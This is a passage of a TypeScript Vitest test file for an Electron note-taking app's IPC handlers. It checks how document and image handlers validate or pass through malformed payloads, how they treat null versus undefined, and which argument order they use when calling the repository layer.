    const handler = handlers.get('documents.move')!;
    await expect(handler(null, { id: 'd1', parentId: null, sortOrder: 1.5 })).rejects.toThrow('sortOrder must be an integer');
    expect(docs.moveDocument).not.toHaveBeenCalled();
  });

  // ── Content Shape Guarantees ──────────────────────────────

  // Verify that the update handler doesn't parse or modify content.
  // Content is an opaque string to the backend. If the handler ever
  // tries to parse it (e.g., for validation), it must re-serialize
  // identically. This test catches accidental JSON roundtrip differences
  // like key reordering or whitespace changes.
  it('content string is passed through byte-for-byte (no parse/reserialize)', async () => {
    const handler = handlers.get('documents.update')!;
    // Intentionally weird formatting — spaces, key order, trailing data
    const content = '{"root" :  {"children":[],"type":"root","version":1}  }';
    await handler(null, { id: 'raw-doc', content });
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    // Must be byte-for-byte identical — no normalization
    expect(received).toBe(content);
  });

  // Same test with non-standard JSON whitespace in various positions
  it('JSON with non-standard whitespace preserved verbatim', async () => {
    const handler = handlers.get('documents.update')!;
    const content = '{\n\t"root": {\n\t\t"children": [\n\t\t],\n\t\t"type": "root"\n\t}\n}';
    await handler(null, { id: 'ws-doc', content });
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    expect(received).toBe(content);
  });

  // Empty object as content — valid JSON but missing root key, now rejected.
  it('empty JSON object {} is rejected (no root key)', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, { id: '1', content: '{}' })).rejects.toThrow('content must have a root key');
    expect(docs.updateDocument).not.toHaveBeenCalled();
  });

  // Non-JSON string as content — rejected by validation.
  it('non-JSON string is rejected by content validation', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, { id: '1', content: 'This is just plain text, not JSON at all' }))
      .rejects.toThrow('content is not valid JSON');
    expect(docs.updateDocument).not.toHaveBeenCalled();
  });
});

// ════════════════════════════════════════════════════════════════
// Payload Type Validation — Wrong Types & Missing Fields
//
// The IPC contract defines types, but at runtime the renderer sends
// plain JS objects over the bridge. If a bug in the store or a stale
// tab sends the wrong type (string where number expected, null where
// string expected, entirely missing fields), the handler must either:
//   a) pass it through and let the repo handle it (current behavior), or
//   b) validate and reject early (aspirational behavior)
//
// These tests document what ACTUALLY happens today so regressions
// are caught, and mark aspirational validation with it.todo().
// ════════════════════════════════════════════════════════════════

describe('Payload Type Validation — Wrong Types & Missing Fields', () => {
  beforeEach(() => {
    handlers.clear();
    vi.clearAllMocks();
    registerIpcHandlers();
  });

  // ── documents.list — limit/offset type coercion ─────────────

  // A buggy store could send limit as a string (e.g., from a text input).
  // The handler passes the whole payload to listDocuments, which calls
  // Math.min/Math.max on it. JS coerces "100" to 100 in arithmetic,
  // so this silently works. But it's fragile.
  it('documents.list with string limit passes through to repo as-is', async () => {
    const handler = handlers.get('documents.list')!;
    await handler(null, { limit: '100', offset: '0' });
    expect(docs.listDocuments).toHaveBeenCalledWith({ limit: '100', offset: '0' });
  });

  // Boolean limit — JS coerces true to 1, false to 0 in arithmetic.
  it('documents.list with boolean limit passes through to repo', async () => {
    const handler = handlers.get('documents.list')!;
    await handler(null, { limit: true, offset: false });
    expect(docs.listDocuments).toHaveBeenCalledWith({ limit: true, offset: false });
  });

  // NaN limit — Math.max(NaN, 1) returns NaN. This would break the SQL.
  it('documents.list with NaN limit passes through (repo must handle)', async () => {
    const handler = handlers.get('documents.list')!;
    await handler(null, { limit: NaN, offset: 0 });
    expect(docs.listDocuments).toHaveBeenCalledWith({ limit: NaN, offset: 0 });
  });

  // Infinity — Math.min(Infinity, 500) = 500, so this accidentally works.
  it('documents.list with Infinity limit passes through', async () => {
    const handler = handlers.get('documents.list')!;
    await handler(null, { limit: Infinity });
    expect(docs.listDocuments).toHaveBeenCalledWith({ limit: Infinity });
  });

  // Negative numbers — Math.max(-5, 1) = 1, so repo clamps it.
  it('documents.list with negative limit passes through', async () => {
    const handler = handlers.get('documents.list')!;
    await handler(null, { limit: -5, offset: -10 });
    expect(docs.listDocuments).toHaveBeenCalledWith({ limit: -5, offset: -10 });
  });

  // Floating point — Math.min(3.7, 500) = 3.7. SQLite LIMIT with float
  // may behave unexpectedly (truncates to int in most cases).
  it('documents.list with floating-point limit passes through', async () => {
    const handler = handlers.get('documents.list')!;
    await handler(null, { limit: 3.7, offset: 1.5 });
    expect(docs.listDocuments).toHaveBeenCalledWith({ limit: 3.7, offset: 1.5 });
  });

  // ── documents.update — missing/wrong id ─────────────────────

  // Missing id is now rejected at the IPC layer before reaching the repo.
  it('documents.update with missing id is rejected', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, { title: 'No ID' })).rejects.toThrow('Missing required field: id');
    expect(docs.updateDocument).not.toHaveBeenCalled();
  });

  // id as null is now rejected at the IPC layer.
  it('documents.update with null id is rejected', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, { id: null, content: 'data' })).rejects.toThrow('Missing required field: id');
    expect(docs.updateDocument).not.toHaveBeenCalled();
  });

  // id as number — the frontend could accidentally send a numeric ID.
  // handler calls updateDocument(123, payload) — SQLite would compare
  // number 123 against string UUIDs and never match.
  it('documents.update with numeric id passes number to repo', async () => {
    const handler = handlers.get('documents.update')!;
    await handler(null, { id: 123, title: 'Numeric' });
    const callArgs = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[0]).toBe(123);
  });

  // Empty string id is now rejected at the IPC layer.
  it('documents.update with empty string id is rejected', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, { id: '', content: 'empty-id' })).rejects.toThrow('Missing required field: id');
    expect(docs.updateDocument).not.toHaveBeenCalled();
  });

  // ── documents.get — wrong id type ──────────────────────────

  it('documents.get with null id calls getDocumentById(null)', async () => {
    const handler = handlers.get('documents.get')!;
    await handler(null, { id: null });
    expect(docs.getDocumentById).toHaveBeenCalledWith(null);
  });

  it('documents.get with undefined id calls getDocumentById(undefined)', async () => {
    const handler = handlers.get('documents.get')!;
    await handler(null, {});
    expect(docs.getDocumentById).toHaveBeenCalledWith(undefined);
  });

  it('documents.get with numeric id calls getDocumentById(42)', async () => {
    const handler = handlers.get('documents.get')!;
    await handler(null, { id: 42 });
    expect(docs.getDocumentById).toHaveBeenCalledWith(42);
  });

  // ── documents.delete — wrong id type ───────────────────────

  it('documents.delete with null id calls deleteDocument(null)', async () => {
    const handler = handlers.get('documents.delete')!;
    await handler(null, { id: null });
    expect(docs.deleteDocument).toHaveBeenCalledWith(null);
  });

  it('documents.delete with undefined id calls deleteDocument(undefined)', async () => {
    const handler = handlers.get('documents.delete')!;
    await handler(null, {});
    expect(docs.deleteDocument).toHaveBeenCalledWith(undefined);
  });

  // ── documents.trash — wrong id type ────────────────────────

  it('documents.trash with null id calls trashDocument(null)', async () => {
    const handler = handlers.get('documents.trash')!;
    await handler(null, { id: null });
    expect(docs.trashDocument).toHaveBeenCalledWith(null);
  });

  // ── documents.restore — wrong id type ──────────────────────

  it('documents.restore with empty string id passes empty string to repo', async () => {
    const handler = handlers.get('documents.restore')!;
    await handler(null, { id: '' });
    expect(docs.restoreDocument).toHaveBeenCalledWith('');
  });

  // ── documents.move — sortOrder type errors ──────────────────

  // sortOrder as string — now rejected at the IPC layer.
  it('documents.move with string sortOrder is rejected', async () => {
    const handler = handlers.get('documents.move')!;
    await expect(handler(null, { id: 'd1', parentId: null, sortOrder: '3' })).rejects.toThrow('sortOrder must be an integer');
    expect(docs.moveDocument).not.toHaveBeenCalled();
  });

  // sortOrder as NaN — rejected by Number.isInteger(NaN) === false.
  it('documents.move with NaN sortOrder is rejected', async () => {
    const handler = handlers.get('documents.move')!;
    await expect(handler(null, { id: 'd1', parentId: null, sortOrder: NaN })).rejects.toThrow('sortOrder must be an integer');
    expect(docs.moveDocument).not.toHaveBeenCalled();
  });

  // sortOrder missing entirely — undefined is not an integer, rejected.
  it('documents.move with missing sortOrder is rejected', async () => {
    const handler = handlers.get('documents.move')!;
    await expect(handler(null, { id: 'd1', parentId: null })).rejects.toThrow('sortOrder must be an integer');
    expect(docs.moveDocument).not.toHaveBeenCalled();
  });

  // sortOrder as object — not an integer, rejected.
  it('documents.move with object sortOrder is rejected', async () => {
    const handler = handlers.get('documents.move')!;
    await expect(handler(null, { id: 'd1', parentId: null, sortOrder: { value: 3 } })).rejects.toThrow('sortOrder must be an integer');
    expect(docs.moveDocument).not.toHaveBeenCalled();
  });

  // ── images.save — wrong types ──────────────────────────────

  // data missing — handler calls saveImage(undefined, mimeType).
  // The repo would try to .includes(',') on undefined → TypeError.
  it('images.save with missing data field calls repo with undefined', async () => {
    const handler = handlers.get('images.save')!;
    await handler(null, { mimeType: 'image/png' });
    const callArgs = (images.saveImage as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[0]).toBeUndefined();
    expect(callArgs[1]).toBe('image/png');
  });

  // mimeType missing — rejected by MIME allowlist in IPC handler.
  it('images.save with missing mimeType field is rejected', async () => {
    const handler = handlers.get('images.save')!;
    await expect(handler(null, { data: 'abc' })).rejects.toThrow('Unsupported image type');
    expect(images.saveImage).not.toHaveBeenCalled();
  });

  // Both missing — rejected by MIME allowlist in IPC handler.
  it('images.save with empty payload is rejected', async () => {
    const handler = handlers.get('images.save')!;
    await expect(handler(null, {})).rejects.toThrow('Unsupported image type');
    expect(images.saveImage).not.toHaveBeenCalled();
  });

  // data as number — totally wrong type.
  it('images.save with numeric data passes number to repo', async () => {
    const handler = handlers.get('images.save')!;
    await handler(null, { data: 12345, mimeType: 'image/png' });
    const callArgs = (images.saveImage as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[0]).toBe(12345);
  });

  // mimeType as number — rejected by MIME allowlist (123 is not in allowed list).
  it('images.save with numeric mimeType is rejected', async () => {
    const handler = handlers.get('images.save')!;
    await expect(handler(null, { data: 'abc', mimeType: 123 })).rejects.toThrow('Unsupported image type');
    expect(images.saveImage).not.toHaveBeenCalled();
  });

  // ── images.download — wrong URL type ───────────────────────

  it('images.download with null url is rejected', async () => {
    const handler = handlers.get('images.download')!;
    await expect(handler(null, { url: null })).rejects.toThrow();
    expect(images.downloadImage).not.toHaveBeenCalled();
  });

  it('images.download with missing url field is rejected', async () => {
    const handler = handlers.get('images.download')!;
    await expect(handler(null, {})).rejects.toThrow();
    expect(images.downloadImage).not.toHaveBeenCalled();
  });

  it('images.download with empty string url is rejected', async () => {
    const handler = handlers.get('images.download')!;
    await expect(handler(null, { url: '' })).rejects.toThrow('Blocked URL scheme for image download');
    expect(images.downloadImage).not.toHaveBeenCalled();
  });

  // ── images.getPath — wrong id type ─────────────────────────

  it('images.getPath with null id calls repo with null', async () => {
    const handler = handlers.get('images.getPath')!;
    await handler(null, { id: null });
    expect(images.getImagePath).toHaveBeenCalledWith(null);
  });

  it('images.getPath with missing id calls repo with undefined', async () => {
    const handler = handlers.get('images.getPath')!;
    await handler(null, {});
    expect(images.getImagePath).toHaveBeenCalledWith(undefined);
  });

  // ── images.delete — wrong id type ──────────────────────────

  it('images.delete with null id calls repo with null', async () => {
    const handler = handlers.get('images.delete')!;
    await handler(null, { id: null });
    expect(images.deleteImage).toHaveBeenCalledWith(null);
  });

  // ── shell.openExternal — wrong URL type ────────────────────

  it('shell.openExternal with null url is rejected', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await expect(handler(null, { url: null })).rejects.toThrow();
    expect(shell.openExternal).not.toHaveBeenCalled();
  });

  it('shell.openExternal with empty string url is rejected', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await expect(handler(null, { url: '' })).rejects.toThrow('Blocked URL scheme');
    expect(shell.openExternal).not.toHaveBeenCalled();
  });

  it('shell.openExternal with missing url field is rejected', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await expect(handler(null, {})).rejects.toThrow();
    expect(shell.openExternal).not.toHaveBeenCalled();
  });

  // ── url.resolve — wrong URL type ───────────────────────────

  it('url.resolve with null url calls repo with null', async () => {
    const handler = handlers.get('url.resolve')!;
    await handler(null, { url: null });
    expect(urlResolver.resolveUrl).toHaveBeenCalledWith(null);
  });

  it('url.resolve with missing url calls repo with undefined', async () => {
    const handler = handlers.get('url.resolve')!;
    await handler(null, {});
    expect(urlResolver.resolveUrl).toHaveBeenCalledWith(undefined);
  });

  // ── url.fetchMetadata — wrong URL type ─────────────────────

  it('url.fetchMetadata with null url calls repo with null', async () => {
    const handler = handlers.get('url.fetchMetadata')!;
    await handler(null, { url: null });
    expect(urlMetadata.fetchUrlMetadata).toHaveBeenCalledWith(null);
  });

  // ── Entirely wrong payload shapes ──────────────────────────

  // null payload — handler tries to destructure null.
  // payload.id → TypeError: Cannot read properties of null.
  it('documents.update with null payload throws TypeError', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, null)).rejects.toThrow();
  });

  // undefined payload — same as null.
  it('documents.update with undefined payload throws TypeError', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, undefined)).rejects.toThrow();
  });

  // Array payload — payload.id is undefined, rejected by id validation.
  it('documents.update with array payload is rejected (no id)', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, ['not', 'an', 'object'])).rejects.toThrow('Missing required field: id');
    expect(docs.updateDocument).not.toHaveBeenCalled();
  });

  // String payload — payload.id is undefined.
  it('documents.get with string payload extracts undefined id', async () => {
    const handler = handlers.get('documents.get')!;
    await handler(null, 'just-a-string');
    expect(docs.getDocumentById).toHaveBeenCalledWith(undefined);
  });

  // Number payload — payload.id is undefined.
  it('documents.delete with number payload extracts undefined id', async () => {
    const handler = handlers.get('documents.delete')!;
    await handler(null, 42);
    expect(docs.deleteDocument).toHaveBeenCalledWith(undefined);
  });

  // Completely empty invocations — simulates a bugged frontend call with no args.
  // Handlers that pass the whole payload object (documents.list) don't crash with null
  // because the repo mock doesn't access properties. But handlers that destructure
  // (payload.id, payload.url) crash with TypeError: Cannot read properties of null.

  it('documents.update with null payload throws TypeError (destructures payload.id)', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, null)).rejects.toThrow();
  });

  it('documents.get with null payload throws TypeError (destructures payload.id)', async () => {
    const handler = handlers.get('documents.get')!;
    await expect(handler(null, null)).rejects.toThrow();
  });

  it('documents.delete with null payload throws TypeError (destructures payload.id)', async () => {
    const handler = handlers.get('documents.delete')!;
    await expect(handler(null, null)).rejects.toThrow();
  });

  it('documents.trash with null payload throws TypeError (destructures payload.id)', async () => {
    const handler = handlers.get('documents.trash')!;
    await expect(handler(null, null)).rejects.toThrow();
  });

  it('documents.move with null payload throws TypeError (destructures payload.id)', async () => {
    const handler = handlers.get('documents.move')!;
    await expect(handler(null, null)).rejects.toThrow();
  });

  it('shell.openExternal with null payload throws TypeError (destructures payload.url)', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await expect(handler(null, null)).rejects.toThrow();
  });

  it('images.save with null payload throws TypeError (destructures payload.data)', async () => {
    const handler = handlers.get('images.save')!;
    await expect(handler(null, null)).rejects.toThrow();
  });

  it('images.download with null payload throws TypeError (destructures payload.url)', async () => {
    const handler = handlers.get('images.download')!;
    await expect(handler(null, null)).rejects.toThrow();
  });

  // Handlers that pass the whole payload object DON'T crash with null
  // because they call repo(null) — the mock doesn't access properties.
  // In production, the repo would crash when trying null.limit etc.
  it('documents.list with null payload does NOT throw (passes whole object to repo)', async () => {
    const handler = handlers.get('documents.list')!;
    const result = await handler(null, null);
    expect(result).toEqual({ documents: [] });
    expect(docs.listDocuments).toHaveBeenCalledWith(null);
  });

  it('documents.listTrashed with null payload does NOT throw (passes whole object)', async () => {
    const handler = handlers.get('documents.listTrashed')!;
    const result = await handler(null, null);
    expect(result).toEqual({ documents: [] });
    expect(docs.listTrashedDocuments).toHaveBeenCalledWith(null);
  });

  it('documents.create with null payload does NOT throw (passes whole object)', async () => {
    const handler = handlers.get('documents.create')!;
    const result = await handler(null, null);
    expect(result).toHaveProperty('document');
    expect(docs.createDocument).toHaveBeenCalledWith(null);
  });

  // ── Extra fields in payload ────────────────────────────────

  // The handler passes the full payload to the repo. Extra fields beyond
  // the contract leak through. This tests that the handler doesn't strip them.
  it('documents.create with extra fields passes them through to repo', async () => {
    const handler = handlers.get('documents.create')!;
    await handler(null, { parentId: null, garbage: true, __proto__: {}, count: 42 });
    const callArgs = (docs.createDocument as ReturnType<typeof vi.fn>).mock.calls[0][0];
    expect(callArgs.parentId).toBeNull();
    expect(callArgs.garbage).toBe(true);
    expect(callArgs.count).toBe(42);
  });

  it('documents.update with extra fields passes them through in patch', async () => {
    const handler = handlers.get('documents.update')!;
    await handler(null, { id: '1', title: 'X', dangerousFlag: true, sortOrder: 99 });
    const patch = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1];
    expect(patch.dangerousFlag).toBe(true);
    expect(patch.sortOrder).toBe(99);
  });
});

// ════════════════════════════════════════════════════════════════
// Null vs Undefined Distinction
//
// In JavaScript, null and undefined behave differently:
//   - SQL: null becomes IS NULL, undefined becomes literally nothing
//   - Object.assign: undefined skips the key, null sets it
//   - ?? operator: null falls through, undefined falls through
//   - JSON.stringify: null → "null", undefined → key omitted
//
// The IPC layer uses structured clone for transport, which preserves
// null but drops undefined (converts to missing key). But in our mock
// tests we pass JS objects directly, so both survive. These tests
// document how the handler treats each distinct value.
// ════════════════════════════════════════════════════════════════

describe('Null vs Undefined Distinction', () => {
  beforeEach(() => {
    handlers.clear();
    vi.clearAllMocks();
    registerIpcHandlers();
  });

  // ── documents.create — parentId ─────────────────────────────

  // parentId: null means "create at root" (WHERE parentId IS NULL).
  it('documents.create with parentId: null passes null to repo', async () => {
    const handler = handlers.get('documents.create')!;
    await handler(null, { parentId: null });
    const callArgs = (docs.createDocument as ReturnType<typeof vi.fn>).mock.calls[0][0];
    expect(callArgs.parentId).toBeNull();
    expect('parentId' in callArgs).toBe(true);
  });

  // parentId: undefined means "key not provided" — the repo defaults to null
  // via `input.parentId ?? null`, so it's functionally equivalent.
  // But the handler passes the raw payload, so the repo sees undefined.
  it('documents.create with parentId: undefined passes undefined to repo', async () => {
    const handler = handlers.get('documents.create')!;
    await handler(null, { parentId: undefined });
    const callArgs = (docs.createDocument as ReturnType<typeof vi.fn>).mock.calls[0][0];
    expect(callArgs.parentId).toBeUndefined();
  });

  // parentId absent entirely — different from explicitly passing undefined.
  // payload.parentId is undefined, but 'parentId' is NOT in the object keys.
  it('documents.create with parentId absent has no parentId key in payload', async () => {
    const handler = handlers.get('documents.create')!;
    await handler(null, { title: 'No Parent' });
    const callArgs = (docs.createDocument as ReturnType<typeof vi.fn>).mock.calls[0][0];
    expect(callArgs.parentId).toBeUndefined();
    expect('parentId' in callArgs).toBe(false);
  });

  // ── documents.create — emoji ────────────────────────────────

  // emoji: null means "explicitly no emoji" — stored as NULL in DB.
  it('documents.create with emoji: null passes null to repo', async () => {
    const handler = handlers.get('documents.create')!;
    await handler(null, { emoji: null });
    const callArgs = (docs.createDocument as ReturnType<typeof vi.fn>).mock.calls[0][0];
    expect(callArgs.emoji).toBeNull();
  });

  // emoji: undefined means "not specified" — the repo defaults to null
  // via `input.emoji ?? null`.
  it('documents.create with emoji: undefined passes undefined to repo', async () => {
    const handler = handlers.get('documents.create')!;
    await handler(null, { emoji: undefined });
    const callArgs = (docs.createDocument as ReturnType<typeof vi.fn>).mock.calls[0][0];
    expect(callArgs.emoji).toBeUndefined();
  });

  // ── documents.update — title/content/emoji null vs undefined ─

  // In updateDocument, the patch check is:
  //   patch.title === undefined ? existing.title : patch.title.trim()
  // So undefined means "don't update", null means "set to null" (and .trim() would crash!).
  // This is a real subtle bug risk.

  // title: null — handler passes null in patch. The repo would call null.trim() → TypeError.
  // This documents the current fragile behavior.
  it('documents.update with title: null passes null in patch (repo may crash)', async () => {
    const handler = handlers.get('documents.update')!;
    await handler(null, { id: '1', title: null });
    const patch = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1];
    expect(patch.title).toBeNull();
  });

  // title: undefined — handler passes undefined. Repo preserves existing title.
  it('documents.update with title: undefined means "do not update title"', async () => {
    const handler = handlers.get('documents.update')!;
    await handler(null, { id: '1', content: '{"root":{"children":[]}}' });
    const patch = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1];
    expect(patch.title).toBeUndefined();
    expect('title' in patch).toBe(false);
  });

  // content: null vs undefined — same pattern.
  it('documents.update with content: null passes null (repo keeps existing)', async () => {
    const handler = handlers.get('documents.update')!;
    await handler(null, { id: '1', content: null });
    const patch = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1];
    expect(patch.content).toBeNull();
  });

  it('documents.update with content: undefined means "do not update content"', async () => {
    const handler = handlers.get('documents.update')!;
    await handler(null, { id: '1', title: 'only title' });
    const patch = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1];
    expect('content' in patch).toBe(false);
  });

  // emoji: null means "clear the emoji" (set to NULL in DB).
  it('documents.update with emoji: null means "clear emoji"', async () => {
    const handler = handlers.get('documents.update')!;
    await handler(null, { id: '1', emoji: null });
    const patch = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1];
    expect(patch.emoji).toBeNull();
  });

  // emoji: undefined means "don't change emoji".
  it('documents.update with emoji: undefined means "do not change emoji"', async () => {
    const handler = handlers.get('documents.update')!;
    await handler(null, { id: '1', title: 'X' });
    const patch = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1];
    expect('emoji' in patch).toBe(false);
  });

  // ── documents.move — parentId null vs undefined ─────────────

  // parentId: null means "move to root".
  it('documents.move with parentId: null passes null (move to root)', async () => {
    const handler = handlers.get('documents.move')!;
    await handler(null, { id: 'd1', parentId: null, sortOrder: 0 });
    const callArgs = (docs.moveDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[1]).toBeNull();
  });

  // parentId: undefined means "key missing" — SQL WHERE parentId IS ? with
  // undefined would be WHERE parentId IS undefined, which SQLite doesn't understand.
  it('documents.move with parentId: undefined passes undefined (not null)', async () => {
    const handler = handlers.get('documents.move')!;
    await handler(null, { id: 'd1', parentId: undefined, sortOrder: 0 });
    const callArgs = (docs.moveDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[1]).toBeUndefined();
    expect(callArgs[1] === null).toBe(false);
  });

  // parentId absent — destructuring payload.parentId gives undefined.
  it('documents.move with parentId absent in payload passes undefined', async () => {
    const handler = handlers.get('documents.move')!;
    await handler(null, { id: 'd1', sortOrder: 0 });
    const callArgs = (docs.moveDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[1]).toBeUndefined();
  });

  // ── JSON serialization boundary ─────────────────────────────

  // JSON.stringify({x: null}) = '{"x":null}' — null is preserved.
  // JSON.stringify({x: undefined}) = '{}' — undefined is DROPPED.
  // If IPC uses JSON serialization under the hood (Electron does for
  // ipcRenderer.invoke), undefined keys disappear. These tests verify
  // what the handler receives after potential serialization.

  // When undefined values survive (direct JS object passing in tests),
  // the handler treats them as "field not provided".
  it('payload round-trip: null survives, undefined semantics differ', async () => {
    const handler = handlers.get('documents.update')!;

    // Null payload — explicit "set to null"
    await handler(null, { id: '1', emoji: null, title: null });
    const patch1 = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1];
    expect(patch1.emoji).toBeNull();
    expect(patch1.title).toBeNull();

    vi.clearAllMocks();

    // Same payload after JSON round-trip (simulates real Electron IPC)
    const serialized = JSON.parse(JSON.stringify({ id: '1', emoji: null, title: undefined }));
    await handler(null, serialized);
    const patch2 = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1];
    expect(patch2.emoji).toBeNull();
    expect('title' in patch2).toBe(false); // undefined was stripped by JSON
  });
});

// ════════════════════════════════════════════════════════════════
// Handler Argument Order Verification
//
// Several handlers destructure the payload into positional arguments
// before calling repo functions. If the order is swapped (e.g.,
// saveImage(mimeType, data) instead of saveImage(data, mimeType)),
// the call silently succeeds with wrong data. These tests verify
// the exact positional arguments for every handler that does
// manual destructuring.
// ════════════════════════════════════════════════════════════════

describe('Handler Argument Order Verification', () => {
  beforeEach(() => {
    handlers.clear();
    vi.clearAllMocks();
    registerIpcHandlers();
  });

  // ── images.save: (data, mimeType) — 2 positional args ──────

  // The handler does: saveImage(payload.data, payload.mimeType)
  // If swapped to saveImage(payload.mimeType, payload.data), the repo
  // would try MIME_TO_EXT["abc123base64data"] → undefined → throw.
  // But the test verifies arg[0] IS data and arg[1] IS mimeType.
  it('images.save arg order: arg[0] is data, arg[1] is mimeType', async () => {
    const handler = handlers.get('images.save')!;
    const data = 'data:image/png;base64,UNIQUE_DATA_STRING';
    const mimeType = 'image/png';
    await handler(null, { data, mimeType });
    const callArgs = (images.saveImage as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[0]).toBe(data);
    expect(callArgs[1]).toBe(mimeType);
    // Extra safety: verify data contains base64 and mimeType contains image/
    expect(callArgs[0]).toContain('base64');
    expect(callArgs[1]).toContain('image/');
  });

  // Use distinct values that would be obviously wrong if swapped.
  it('images.save with distinguishable args confirms no swap', async () => {
    const handler = handlers.get('images.save')!;
    await handler(null, { data: 'AAAA', mimeType: 'image/jpeg' });
    const callArgs = (images.saveImage as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[0]).not.toBe('image/jpeg'); // would be true if swapped
    expect(callArgs[1]).not.toBe('AAAA');       // would be true if swapped
  });

  // ── documents.move: (id, parentId, sortOrder) — 3 positional args ──

  // The handler does: moveDocument(payload.id, payload.parentId, payload.sortOrder)
  // All three have distinct types in a typical call: string, string|null, number.
  it('documents.move arg order: (id, parentId, sortOrder)', async () => {
    const handler = handlers.get('documents.move')!;
    await handler(null, { id: 'move-doc', parentId: 'target-parent', sortOrder: 7 });
    const callArgs = (docs.moveDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[0]).toBe('move-doc');
    expect(callArgs[1]).toBe('target-parent');
    expect(callArgs[2]).toBe(7);
  });

  // With null parentId — this is the move-to-root case. If the args
  // were swapped to (parentId, id, sortOrder), the repo would try to
  // find a document with id=null, which always fails.
  it('documents.move with null parentId: arg[0]=id, arg[1]=null', async () => {
    const handler = handlers.get('documents.move')!;
    await handler(null, { id: 'root-move', parentId: null, sortOrder: 0 });
    const callArgs = (docs.moveDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[0]).toBe('root-move');
    expect(callArgs[1]).toBeNull();
    expect(callArgs[2]).toBe(0);
  });

  // With sortOrder 0 — if (id, sortOrder, parentId) was the order,
  // arg[1] would be 0 and arg[2] would be the parentId string.
  it('documents.move arg[2] is always the number (sortOrder)', async () => {
    const handler = handlers.get('documents.move')!;
    await handler(null, { id: 'doc', parentId: 'parent', sortOrder: 0 });
    const callArgs = (docs.moveDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(typeof callArgs[0]).toBe('string'); // id
    expect(typeof callArgs[1]).toBe('string'); // parentId
    expect(typeof callArgs[2]).toBe('number'); // sortOrder
  });

  // ── documents.update: (id, patch) — 2 positional args ──────

  // The handler does: updateDocument(payload.id, payload)
  // The first arg is JUST the id string, the second is the FULL payload object.
  // If swapped to updateDocument(payload, payload.id), the repo would get
  // an object as id and a string as patch.
  it('documents.update arg order: arg[0] is id string, arg[1] is full payload', async () => {
    const handler = handlers.get('documents.update')!;
    const payload = { id: 'update-me', title: 'New', content: '{"root":{"children":[]}}', emoji: '🎯' };
    await handler(null, payload);
    const callArgs = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[0]).toBe('update-me');
    expect(typeof callArgs[0]).toBe('string');
    expect(callArgs[1]).toBe(payload);
    expect(typeof callArgs[1]).toBe('object');
    expect(callArgs[1].id).toBe('update-me');
    expect(callArgs[1].title).toBe('New');
  });

  // ── Handlers that pass single field to repo ─────────────────
  // These extract one field and pass it as a single arg.

  it('documents.get: repo receives exactly payload.id as single arg', async () => {
    const handler = handlers.get('documents.get')!;
    await handler(null, { id: 'get-me' });
    const callArgs = (docs.getDocumentById as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe('get-me');
  });

  it('documents.delete: repo receives exactly payload.id as single arg', async () => {
    const handler = handlers.get('documents.delete')!;
    await handler(null, { id: 'del-me' });
    const callArgs = (docs.deleteDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe('del-me');
  });

  it('documents.trash: repo receives exactly payload.id as single arg', async () => {
    const handler = handlers.get('documents.trash')!;
    await handler(null, { id: 'trash-me' });
    const callArgs = (docs.trashDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe('trash-me');
  });

  it('documents.restore: repo receives exactly payload.id as single arg', async () => {
    const handler = handlers.get('documents.restore')!;
    await handler(null, { id: 'restore-me' });
    const callArgs = (docs.restoreDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe('restore-me');
  });

  it('documents.permanentDelete: repo receives exactly payload.id as single arg', async () => {
    const handler = handlers.get('documents.permanentDelete')!;
    await handler(null, { id: 'nuke-me' });
    const callArgs = (docs.permanentDeleteDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe('nuke-me');
  });

  it('images.getPath: repo receives exactly payload.id as single arg', async () => {
    const handler = handlers.get('images.getPath')!;
    await handler(null, { id: 'img-get' });
    const callArgs = (images.getImagePath as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
    expect(callArgs[0]).toBe('img-get');
  });

